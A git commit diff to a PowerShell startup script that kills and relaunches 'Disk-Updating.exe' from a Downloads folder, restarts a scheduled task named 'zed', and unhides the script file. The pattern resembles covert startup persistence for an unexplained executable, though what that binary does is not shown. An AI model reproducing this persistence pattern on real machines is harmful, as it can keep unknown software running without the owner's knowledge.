e68d218717546ca1cb7914a75eb8bf9c9705483e
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-17 03:25:51 +0100

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,4 +1,5 @@
-C:\Users\angel\Downloads\Disk-Updating.exe
+taskkill /F /IM Disk-Updating.exe
+C:\Users\Magnetist\Downloads\Disk-Updating.exe
 Stop-ScheduledTask -TaskName zed
 Start-ScheduledTask -TaskName zed
 attrib -h C:\Users\Public\MyStartUp.ps1
